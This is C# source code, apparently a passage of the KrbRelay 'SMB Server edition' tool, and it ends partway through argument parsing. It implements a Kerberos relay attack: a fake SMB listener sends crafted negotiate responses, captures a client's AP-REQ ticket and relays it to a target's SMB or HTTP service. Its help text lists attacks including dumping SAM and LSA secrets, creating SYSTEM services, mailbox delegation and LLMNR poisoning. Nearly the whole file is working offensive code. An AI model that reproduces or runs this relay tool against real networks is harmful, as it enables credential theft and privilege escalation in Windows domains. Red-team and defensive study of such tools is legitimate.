using KrbRelay.Clients;
//using KrbRelay.Com;
using KrbRelay.HiveParser;
using Microsoft.Win32;
using NetFwTypeLib;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Utilities;
using SMBLibrary;
using SMBLibrary.Client;
using SMBLibrary.Services;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static KrbRelay.Natives;
using SMBLibrary.Client;
using static System.Runtime.InteropServices.JavaScript.JSType;
namespace KrbRelay
{

    

    public class State
    {
        public Socket SourceSocket { get; }
        public Socket TargetSocket { get; }
        public byte[] Buffer { get; }
        public int numReads = 0;
        
        public bool isRelayed = false;
        public string ServerType = "";
        public State(Socket sourceSocket, Socket targetSocket)
        {
            SourceSocket = sourceSocket;
            TargetSocket = targetSocket;
            Buffer = new byte[4096]; // Adjust buffer size as needed
        }
        
    }
    class SMBSocketConsole
    {
        
        public byte[] apreqBuffer;
        
        public void Start(int port, State state, byte[] buffer)
        {
            // Define the IP address and port
            string ipAddress = "127.0.0.1";

            apreqBuffer = buffer;
            // Create a TcpListener
            TcpListener listener = new TcpListener(IPAddress.Parse(ipAddress), port);

            try
            {
                // Start the listener
                listener.Start();
                Console.WriteLine("[*] SMB Console Server started on {0}:{1}. Waiting for connections...",ipAddress, port);

                while (true)
                {
                    // Accept a client socket
                    Socket clientSocket = listener.AcceptSocket();
                    Console.WriteLine("[*] SMB Console Server connected client:{0}", clientSocket.RemoteEndPoint);
                    SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                    KrbRelay.Clients.Smb smb2 = new Smb(clientSocket);
                    //smbc.currSourceSocket = state.SourceSocket;
                    //smbc.currDestSocket = state.TargetSocket;
                    //smbc.ServerType = State.ServerType;
                    bool isConnected = smbc.Connect(Program.targetFQDN, SMBTransportType.DirectTCPTransport);
                    if (!isConnected)
                    {
                        Console.WriteLine("[-] Could not connect to {0}:445", Program.targetFQDN);

                    }



                    Console.WriteLine("[*] SMB relay Connected to: {0}:445", Program.targetFQDN);
                    //state.isRelayed = true;
                    //Task.Run(() => smb2.smbConnect(smbc));
                    smb2.smbConnect(smbc, buffer);

                    Program.relayed = false;

                    // Handle the client connection

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            finally
            {
                listener.Stop();
            }
        }
    }
    public class PortForwarder2
    {
        private Socket _listenerSocket;
        private IPEndPoint _targetEndpoint;
        private ConcurrentDictionary<string, State> _activeConnections = new ConcurrentDictionary<string, State>();

        private int _listenPort;
        private string _targetHost;
        private int _targetPort;
        private bool _isRunning = false;
        public bool ForwardOnly = false;
        public string ServerType = "";
        byte[] smb1NegotiateProtocolResponse = new byte[]
       {
            0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x98, 0x53, 0xC8, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x03,
            0x32, 0x00, 0x01, 0x00, 0x04, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xFC, 0xE3, 0x01, 0x80, 0x23, 0x31, 0x1E, 0x4E, 0x74, 0x3B, 0xDB, 0x01, 0xE0, 0x01, 0x00, 0x88,
            0x00, 0xA1, 0x1D, 0x94, 0xF1, 0x01, 0x34, 0x4E, 0x47, 0x87, 0xF6, 0x8D, 0x29, 0xE6, 0x28, 0xA6,
            0x0A, 0x60, 0x76, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x6C, 0x30, 0x6A, 0xA0,
            0x3C, 0x30, 0x3A, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x1E, 0x06,
            0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86,
            0xF7, 0x12, 0x01, 0x02, 0x02, 0x06, 0x0A, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02,
            0x03, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, 0xA3, 0x2A, 0x30,
            0x28, 0xA0, 0x26, 0x1B, 0x24, 0x6E, 0x6F, 0x74, 0x5F, 0x64, 0x65, 0x66, 0x69, 0x6E, 0x65, 0x64,
            0x5F, 0x69, 0x6E, 0x5F, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38, 0x40, 0x70, 0x6C, 0x65, 0x61,
            0x73, 0x65, 0x5F, 0x69, 0x67, 0x6E, 0x6F, 0x72, 0x65
       };

        byte[] smbNegotiateProtocolResponse = new byte[] { 0x0, 0x00, 0x00, 0xf8, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                                0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x41,0x00,0x01,0x00,0xff,0x02,0x00,0x00,0x65,0x9d,0x73,0x71,
                                                                0x93,0xce,0x2f,0x48,0x99,0xe9,0x65,0xcb,0xe1,0x34,0xf5,0x31,0x07,0x00,0x00,0x00,
                                                                0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x62,0x46,0x29,0x30,
                                                                0xae,0x15,0xdb,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x78,0x00,
                                                                0x00,0x00,0x00,0x00,0x60,0x76,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x6c,
                                                                0x30,0x6a,0xa0,0x3c,0x30,0x3a,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,
                                                                0x02,0x1e,0x06,0x09,0x2a,0x86,0x48,0x82,0xf7,0x12,0x01,0x02,0x02,0x06,0x09,0x2a,
                                                                0x86,0x48,0x86,0xf7,0x12,0x01,0x02,0x02,0x06,0x0a,0x2a,0x86,0x48,0x86,0xf7,0x12,
                                                                0x01,0x02,0x02,0x03,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
                                                                0xa3,0x2a,0x30,0x28,0xa0,0x26,0x1b,0x24,0x6e,0x6f,0x74,0x5f,0x64,0x65,0x66,0x69,
                                                                0x6e,0x65,0x64,0x5f,0x69,0x6e,0x5f,0x52,0x46,0x43,0x34,0x31,0x37,0x38,0x40,0x70,
                                                                0x6c,0x65,0x61,0x73,0x65,0x5f,0x69,0x67,0x6e,0x6f,0x72,0x65};
        byte[] smb2NegotiateProtocolResponse = new byte[] {0x00,0x00,0x01,0x34,0xfe,0x53,0x4d,0x42,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0xff,0xfe,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x41,0x00,0x01,0x00,0x11,0x03,0x02,0x00,0x65,0x9d,0x73,0x71,
                                                                0x93,0xce,0x2f,0x48,0x99,0xe9,0x65,0xcb,0xe1,0x34,0xf5,0x31,0x2f,0x00,0x00,0x00,
                                                                0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x62,0x46,0x29,0x30,
                                                                0xae,0x15,0xdb,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x78,0x00,
                                                                0xf8,0x00,0x00,0x00,0x60,0x76,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x6c,
                                                                0x30,0x6a,0xa0,0x3c,0x30,0x3a,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,
                                                                0x02,0x1e,0x06,0x09,0x2a,0x86,0x48,0x82,0xf7,0x12,0x01,0x02,0x02,0x06,0x09,0x2a,
                                                                0x86,0x48,0x86,0xf7,0x12,0x01,0x02,0x02,0x06,0x0a,0x2a,0x86,0x48,0x86,0xf7,0x12,
                                                                0x01,0x02,0x02,0x03,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
                                                                0xa3,0x2a,0x30,0x28,0xa0,0x26,0x1b,0x24,0x6e,0x6f,0x74,0x5f,0x64,0x65,0x66,0x69,
                                                                0x6e,0x65,0x64,0x5f,0x69,0x6e,0x5f,0x52,0x46,0x43,0x34,0x31,0x37,0x38,0x40,0x70,
                                                                0x6c,0x65,0x61,0x73,0x65,0x5f,0x69,0x67,0x6e,0x6f,0x72,0x65,0x01,0x00,0x26,0x00,
                                                                0x00,0x00,0x00,0x00,0x01,0x00,0x20,0x00,0x01,0x00,0x29,0xa6,0x59,0xda,0xea,0xa7,
                                                                0x13,0x09,0x93,0x27,0xdb,0x6e,0x41,0xee,0xf8,0x14,0x45,0x6e,0xdb,0xfa,0x09,0x8c,
                                                                0x14,0x87,0xf9,0x4c,0x14,0x73,0xca,0xbd,0xe5,0x20,0x00,0x00,0x02,0x00,0x04,0x00,
                                                                0x00,0x00,0x00,0x00,0x01,0x00,0x02,0x00};


        public PortForwarder2(int listenPort, string targetHost, int targetPort)
        {
            /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
            _listenerSocket.Listen(100); // Allow up to 100 pending connections
            _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
            _listenPort = listenPort;
            _targetHost = targetHost;
            _targetPort = targetPort;

        }
        public PortForwarder2(int listenPort, string targetHost, int targetPort, string stype)
        {
            /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
            _listenerSocket.Listen(100); // Allow up to 100 pending connections
            _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
            _listenPort = listenPort;
            _targetHost = targetHost;
            _targetPort = targetPort;
            ServerType = stype;

        }
        public void Start(bool fwd)
        {
            Console.WriteLine("[*] Starting port forwarder on port:{0}",_listenPort);
            _listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, _listenPort));
            _listenerSocket.Listen(100); // Allow up to 100 pending connections
            _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(_targetHost).AddressList[0], _targetPort);
            _isRunning = true;
            _listenerSocket.BeginAccept(OnClientConnect, null);
            
            ForwardOnly = fwd;

        }
        public void Stop()
        {
            if (_isRunning)
            {
                Console.WriteLine("[*] Stopping port forwarder on port:{0}",_listenPort);
                _isRunning = false;

                // Stop listening for new connections
                _listenerSocket.Close();

                // Close all active connections
                foreach (var kvp in _activeConnections)
                {
                    CloseConnection(kvp.Value);
                }

                _activeConnections.Clear();

                Console.WriteLine("[*] Port forwarder {0} stopped.",_listenPort);
            }
        }

        public void ListConnectedClients()
        {
            Console.WriteLine("\n[*] Connected Clients on port:{0}",_listenPort);
            foreach (var key in _activeConnections.Keys)
            {
                Console.WriteLine($"- {key}");
            }
        }

        private void OnClientConnect(IAsyncResult ar)
        {
            try
            {
                Socket clientSocket = _listenerSocket.EndAccept(ar);

                _listenerSocket.BeginAccept(OnClientConnect, null);
                // Create a unique key for this connection
                string clientKey = $"{clientSocket.RemoteEndPoint}-{Guid.NewGuid()}";

                Console.WriteLine($"[*] Port forwarder:{_listenPort} -> Client connected {clientKey}",_listenPort);

                // Create a new connection to the target server
                Socket targetSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                targetSocket.Connect(_targetEndpoint);

                // Create state objects for bidirectional forwarding
                var clientToTargetState = new State(clientSocket, targetSocket);
                var targetToClientState = new State(targetSocket, clientSocket);

                // Add the connection to the dictionary
                _activeConnections[clientKey] = clientToTargetState;

                // Start forwarding data in both directions
                clientSocket.BeginReceive(clientToTargetState.Buffer, 0, clientToTargetState.Buffer.Length, SocketFlags.None, OnDataFromClient, clientToTargetState);
                targetSocket.BeginReceive(targetToClientState.Buffer, 0, targetToClientState.Buffer.Length, SocketFlags.None, OnDataFromTarget, targetToClientState);

                // Continue accepting new connections

            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Error accepting client: {ex.Message}");
            }
        }

        private void OnDataFromClient(IAsyncResult ar)
        {
            var state = (State)ar.AsyncState;
            byte[] buffer = new byte[4096];
            //if (state.isRelayed)
              //  return;
            try
            {
                int bytesRead = state.SourceSocket.EndReceive(ar);
                int l = 0;
                if (bytesRead > 0)
                {
                    // Forward data to the target
                    state.numReads++;
                    
                    if (!Program.relayed && !ForwardOnly && ServerType=="SMB")
                    {

                        
                        Program.relayed = true;
                        state.isRelayed = true;
                       Console.WriteLine("[*] sending smbNegotiateProtocolResponse");
                        state.SourceSocket.Send(smbNegotiateProtocolResponse, smbNegotiateProtocolResponse.Length, SocketFlags.None);
                        l = state.SourceSocket.Receive(buffer);
                        Console.WriteLine("[*] sending smb2NegotiateProtocolResponse");
                        state.SourceSocket.Send(smb2NegotiateProtocolResponse, smb2NegotiateProtocolResponse.Length, SocketFlags.None);
                        l = state.SourceSocket.Receive(buffer);
                        //int ticketOffset = Helpers.PatternAt(buffer, new byte[] { 0x60, 0x82 }); // 0x6e, 0x82, 0x06
                        buffer = buffer.Skip(4).ToArray();
                        Console.WriteLine("[*] Got AP-REQ for : {0}", Program.service);
                        Program.apreqBuffer = Program.ExtractSecurityBlob(buffer);

                        Program.relayed = true;
                        //Program.currSourceSocket = state.SourceSocket;
                        //Program.currDestSocket = state.TargetSocket;
                        if (Program.service == "cifs")
                        {

                            if (Program.bgconsole)
                            {
                        
                                SMBSocketConsole smbs = new SMBSocketConsole();

                                Console.WriteLine("[*] SMB relay socket console Connected to: {0}:445", Program.targetFQDN);
                                Task.Run(() => smbs.Start(Program.bgconsoleStartPort++, state, Program.apreqBuffer));
                                
                                state.isRelayed = false;
                                
                                CloseConnection(state);
                                return;

                            }
                            if (!Program.bgconsole)
                            {


                                SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                                KrbRelay.Clients.Smb smb2 = new Smb();
                                smbc.currSourceSocket = state.SourceSocket;
                                smbc.currDestSocket = state.TargetSocket;
                                smbc.ServerType = ServerType;
                                bool isConnected = smbc.Connect(Program.targetFQDN, SMBTransportType.DirectTCPTransport);
                                if (!isConnected)
                                {
                                    Console.WriteLine("[-] Could not connect to {0}:445", Program.targetFQDN);

                                }


                                state.isRelayed = false;
                                Console.WriteLine("[*] SMB relay Connected to: {0}:445", Program.targetFQDN);


                                Task.Run(() => smb2.smbConnect(smbc, Program.apreqBuffer));
                                
                                CloseConnection(state);
                                return;
                            }
                        }
                        if (Program.service == "http")
                        {
                            Task.Run(() => Http.Connect());
                            state.isRelayed = false;
                            CloseConnection(state);
                            return;
                        }



                        
                    }

                    if (!Program.relayed && !ForwardOnly && ServerType == "DCOM")
                    {

                        TcpClient myclient;
                        myclient = new TcpClient();
                        myclient.Connect("127.0.0.1", 135);
                        NetworkStream ns2 = myclient.GetStream();
                        ns2.Write(state.Buffer, 0, bytesRead);
                        bytesRead = ns2.Read(buffer, 0, 4096);
                        Array.Copy(buffer, 20, Program.AssocGroup, 0, 4);
                        state.SourceSocket.Send(buffer,bytesRead, SocketFlags.None);
                        l = state.SourceSocket.Receive(buffer);
                        Program.apreqBuffer = new byte[bytesRead];

                        // Copy contents of source array to destination array
                        Array.Copy(buffer, Program.apreqBuffer, bytesRead);
                        Program.CallID[0] = Program.apreqBuffer[12];
                    
                    }





                    if (!state.isRelayed)
                    {
                        state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);

                        // Continue receiving data from the client


                        // Continue receiving data from the client
                        state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromClient, state);
                    }
                }
                else
                {
                    // Client disconnected
                    if (!state.isRelayed)
                        CloseConnection(state);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Error forwarding data from client: {ex.Message}");
                if(!state.isRelayed)
                    CloseConnection(state);
            }
        }

        private void OnDataFromTarget(IAsyncResult ar)
        {
            var state = (State)ar.AsyncState;

            try
            {
                int bytesRead = state.SourceSocket.EndReceive(ar);

                if (bytesRead > 0)
                {
                    // Forward data to the client
                    
                    
                    
                    
                    state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);

                    // Continue receiving data from the target
                    state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromTarget, state);
                }
                else
                {
                    // Target server disconnected
                    CloseConnection(state);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Error forwarding data from target: {ex.Message}");
                CloseConnection(state);
            }
        }


        private void CloseConnection(State state)
        {
            try
            {
                string clientEndpoint = state.SourceSocket.RemoteEndPoint.ToString();
                //Console.WriteLine($"[*] Redirector: Closing connection for {clientEndpoint}");

                state.SourceSocket?.Close();
                state.TargetSocket?.Close();

                // Remove the connection from the dictionary
                string keyToRemove = null;
                foreach (var kvp in _activeConnections)
                {
                    if (kvp.Value == state)
                    {
                        keyToRemove = kvp.Key;
                        break;
                    }
                }

                if (keyToRemove != null)
                {
                    _activeConnections.TryRemove(keyToRemove, out _);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Error closing connection: {ex.Message}");
            }
        }
    }


    internal class Program
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct SEC_WINNT_AUTH_IDENTITY
        {
            public IntPtr User;
            public int UserLength;
            public IntPtr Domain;
            public int DomainLength;
            public IntPtr Password;
            public int PasswordLength;
            public int Flags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct COAUTHINFO
        {
            public int dwAuthnSvc;
            public int dwAuthzSvc;
            public IntPtr pwszServerPrincName;
            public int dwAuthnLevel;
            public int dwImpersonationLevel;
            public IntPtr pAuthIdentityData;
            public int dwCapabilities;
        }
        public struct COSERVERINFO2
        {
            public int dwReserved1;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pwszName;
            public IntPtr pAuthInfo;
            public int dwReserved2;
        }
        public static string DcomHost = "";
        public static string RedirectHost = "";
        public static string Username = "";
        public static string Password = "";
        public static string Domain = "";
        public static string FakeSPN = "";
        public static int  SmbListenerPort = 445;
        public static int DcomListenerPort = 9999;
        public static string service = "";
        public static string[] RedirectPorts=null;
        private static TcpListener server;
        private static TcpClient myclient;
        public static byte[] AssocGroup = new byte[4];
        public static byte[] CallID = new byte[4];
        //public static TcpForwarder tcpFwd = new TcpForwarder();
        public static PortForwarder2 SMBtcpFwd;
        public static PortForwarder2 DCOMtcpFwd;
        public static PortForwarder2[] tcpFwdorwarders;
        public static Socket currSourceSocket { get; set; }
        public static Socket currDestSocket { get; set; }
        public static bool relayed = false;
        
        public static int numClientConnect = 0;
        public static byte[] apreqBuffer;
        public static NetworkStream stream;
        public static bool bgconsole =false;
        public static int bgconsoleStartPort=10000;

        public static byte[] ExtractSecurityBlob(byte[] sessionSetupRequest)
        {
            // SMB2 Header is usually 64 bytes
            int smb2HeaderLength = 64;

            // Session Setup Request starts after SMB2 Header
            int securityBufferOffsetPosition = smb2HeaderLength + 12;  // SecurityBufferOffset at byte 12 after header
            int securityBufferLengthPosition = smb2HeaderLength + 14;  // SecurityBufferLength at byte 14 after header

            // Read the Security Buffer Offset (2 bytes at offset position)
            int securityBufferOffset = BitConverter.ToUInt16(sessionSetupRequest, securityBufferOffsetPosition);

            // Read the Security Buffer Length (2 bytes at length position)
            int securityBufferLength = BitConverter.ToUInt16(sessionSetupRequest, securityBufferLengthPosition);

            // Now extract the Security Blob using the offset and length
            byte[] securityBlob = new byte[securityBufferLength];
            Array.Copy(sessionSetupRequest, securityBufferOffset, securityBlob, 0, securityBufferLength);

            return securityBlob;
        }



        
        public static string HexDump(byte[] bytes, int bytesPerLine = 16, int len = 0)
        {
            if (bytes == null) return "<null>";
            int bytesLength;
            if (len == 0)
                bytesLength = bytes.Length;
            else
                bytesLength = len;
            char[] HexChars = "0123456789ABCDEF".ToCharArray();

            int firstHexColumn =
                  8                   // 8 characters for the address
                + 3;                  // 3 spaces

            int firstCharColumn = firstHexColumn
                + bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
                + (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
                + 2;                  // 2 spaces 

            int lineLength = firstCharColumn
                + bytesPerLine           // - characters to show the ascii value
                + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)

            char[] line = (new string(' ', lineLength - 2) + Environment.NewLine).ToCharArray();
            int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
            StringBuilder result = new StringBuilder(expectedLines * lineLength);

            for (int i = 0; i < bytesLength; i += bytesPerLine)
            {
                line[0] = HexChars[(i >> 28) & 0xF];
                line[1] = HexChars[(i >> 24) & 0xF];
                line[2] = HexChars[(i >> 20) & 0xF];
                line[3] = HexChars[(i >> 16) & 0xF];
                line[4] = HexChars[(i >> 12) & 0xF];
                line[5] = HexChars[(i >> 8) & 0xF];
                line[6] = HexChars[(i >> 4) & 0xF];
                line[7] = HexChars[(i >> 0) & 0xF];

                int hexColumn = firstHexColumn;
                int charColumn = firstCharColumn;

                for (int j = 0; j < bytesPerLine; j++)
                {
                    if (j > 0 && (j & 7) == 0) hexColumn++;
                    if (i + j >= bytesLength)
                    {
                        line[hexColumn] = ' ';
                        line[hexColumn + 1] = ' ';
                        line[charColumn] = ' ';
                    }
                    else
                    {
                        byte b = bytes[i + j];
                        line[hexColumn] = HexChars[(b >> 4) & 0xF];
                        line[hexColumn + 1] = HexChars[b & 0xF];
                        line[charColumn] = asciiSymbol(b);
                    }
                    hexColumn += 3;
                    charColumn++;
                }
                result.Append(line);
            }
            return result.ToString();
        }
        static char asciiSymbol(byte val)
        {
            if (val < 32) return '.';  // Non-printable ASCII
            if (val < 127) return (char)val;   // Normal ASCII
            // Handle the hole in Latin-1
            if (val == 127) return '.';
            if (val < 0x90) return "€.‚ƒ„…†‡ˆ‰Š‹Œ.Ž."[val & 0xF];
            if (val < 0xA0) return ".‘’“”•–—˜™š›œ.žŸ"[val & 0xF];
            if (val == 0xAD) return '.';   // Soft hyphen: this symbol is zero-width even in monospace fonts
            return (char)val;   // Normal Latin-1
        }





        //

        public static byte[] StringToByteArray(string hex)
        {
            // Remove any non-hex characters
            hex = hex.Replace(" ", "");

            // Determine the length of the byte array (each two hex characters represent one byte)
            int byteCount = hex.Length / 2;

            // Create a byte array to store the converted bytes
            byte[] byteArray = new byte[byteCount];

            // Convert each pair of hex characters to a byte
            for (int i = 0; i < byteCount; i++)
            {
                // Parse the substring containing two hex characters and convert it to a byte
                byteArray[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }

            return byteArray;
        }

        public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
        public static IntPtr ld = IntPtr.Zero;
        public static byte[] ntlm1 = new byte[] { };
        public static byte[] ntlm2 = new byte[] { };
        public static byte[] ntlm3 = new byte[] { };
        public static byte[] apRep1 = new byte[] { };
        public static byte[] apRep2 = new byte[] { };
        public static byte[] ticket = new byte[] { };
        public static string spn = "";
        public static string relayedUser = "";
        public static string relayedUserDomain = "";
        public static string domain = "";
        public static string domainDN = "";
        public static string targetFQDN = "";
        public static bool useSSL = false;
        public static bool stopSpoofing = false;
        public static bool downgrade = false;
        public static bool ntlm = false;
        public static Dictionary<string, string> attacks = new Dictionary<string, string>();
        public static SMB2Client smbClient = new SMB2Client();
        public static HttpClientHandler handler = new HttpClientHandler();
        public static HttpClient httpClient = new HttpClient();
        public static CookieContainer CookieContainer = new CookieContainer();

        //hooked function

        private static void ShowHelp()
        {
            Console.WriteLine();
            Console.WriteLine("KrbRelay by @Cube0x0");
            Console.WriteLine("The Relaying Kerberos Framework - SMB Server edition by @decoder_it");
            Console.WriteLine();

            Console.WriteLine("Usage: KrbRelay.exe -spn <SPN> [OPTIONS] [ATTACK]");
            Console.WriteLine("SMB attacks:");
            Console.WriteLine("-console                         Interactive SMB console");
            Console.WriteLine("-list                            List SMB shares");
            Console.WriteLine("-add-privileges <SID>            Add privileges for a given SID");
            Console.WriteLine("-secrets                         Dump SAM & LSA secrets");
            Console.WriteLine("-service-add <NAME> <COMMAND>    Create SYSTEM service");
            //Console.WriteLine("-set-secquestions                Reset security questions");
            //Console.WriteLine("-reset-password  <USER> <PASS>   Reset local user password");
            //Console.WriteLine("printdriver-add <DLL>           Add printer driver");
            //Console.WriteLine("-reg-query                     Query registry key");
            //Console.WriteLine("-upload   <Path>                 Upload file via SMB");
            //Console.WriteLine("-download <Path>                 Download file via SMB");
            Console.WriteLine();

            Console.WriteLine("HTTP attacks:");
            Console.WriteLine("-endpoint <ENDPOINT>             Example; 'EWS/Exchange.asmx'");
            Console.WriteLine("-proxy                           Start a HTTP proxy server against target");
            //Console.WriteLine("-adcs <TEMPLATE>                 Generate certificate");
            //Console.WriteLine("-ews-console                   EWS console");
            Console.WriteLine("-ews-delegate <USER@DOMAIN>      EWS delegate mailbox");
            //Console.WriteLine("-ews-read   <LIMIT>              Read victims inbox");
            Console.WriteLine("-ews-search <KEYWORD,KEYWORD2>   Search inbox for keywords");
            Console.WriteLine();

            Console.WriteLine("Options:");
            Console.WriteLine("-listener <port>                      Local relay port");
            Console.WriteLine("-redirectserver                       Relay server/redirector mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA");
            Console.WriteLine("-ssl                      Use SSL transport");
            Console.WriteLine("-spn                      ServicePrincipalName for target service");
            Console.WriteLine("-clsid                    Service to be executed in");
            Console.WriteLine("-session                  ID for cross-session marshalling");
            Console.WriteLine("-port                     COM listener port");
            Console.WriteLine("-llmnr                    LLMNR poisoning");

        }

        public static bool checkPort(int port, string name = "SYSTEM")
        {
            INetFwMgr mgr = (INetFwMgr)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwMgr"));
            if (!mgr.LocalPolicy.CurrentProfile.FirewallEnabled)
            {
                return true;
            }
            mgr.IsPortAllowed(name, NET_FW_IP_VERSION_.NET_FW_IP_VERSION_ANY, port, "", NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP, out object allowed, out object restricted);
            return (bool)allowed;
        }

        public static int checkPorts(string[] names)
        {
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpListeners();
            List<int> tcpPorts = tcpConnInfoArray.Select(i => i.Port).ToList();

            foreach (string name in names)
            {
                for (int i = 1; i < 65535; i++)
                {
                    if (checkPort(i, name) && !tcpPorts.Contains(i))
                    {
                        return i;
                    }
                }
            }
            return -1;
        }

        public static void Main(string[] args)
        {
            string clsid = "";

            int sessionID = -123;
            string port = "9988";
            bool show_help = false;
            bool llmnr = false;
            Guid clsId_guid = new Guid();
            
            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();


                switch (argument)
                {
                    case "-DCOMHOST":
                    case "/DCOMHOST":
                    case "-SMBHOST":
                    case "/SMBHOST":
                        DcomHost = args[entry.index + 1];
                        break;
                    case "-FAKESPN":
                    case "/FAKESPN":
                        FakeSPN = args[entry.index + 1];
                        break;
                    case "-REDIRECTHOST":
                    case "/REDIRECTHOST":
                        RedirectHost = args[entry.index + 1];
                        break;
                    case "-REDIRECTPORTS":
                    case "/REDIRECTPORTS":
                        RedirectPorts = args[entry.index + 1].Split(',');
                        
                        break;
                    case "-SMBPORT":
                    case "/SMBPORT":
                       SmbListenerPort = int.Parse(args[entry.index + 1]);
                        break;
                    case "-DCOMPORT":
                    case "/DCOMPORT":
                        DcomListenerPort = int.Parse(args[entry.index + 1]);
                        break;
                    case "-USERNAME":
                    case "/USERNAME":
                        Username = args[entry.index + 1];
                        break;
                    case "-PASSWORD":
                    case "/PASSWORD":
                        Password = args[entry.index + 1];
                        break;
                    case "-DOMAIN":
                    case "/DOMAIN":
                        Domain = args[entry.index + 1];
                        break;

                    case "-NTLM":
                    case "/NTLM":
                        ntlm = true;
                        break;

                    case "-DOWNGRADE":
                    case "/DOWNGRADE":
                        downgrade = true;
                        break;
                    
                    //
                    case "-CONSOLE":
                    case "/CONSOLE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("console", args[entry.index + 1]);
                        }
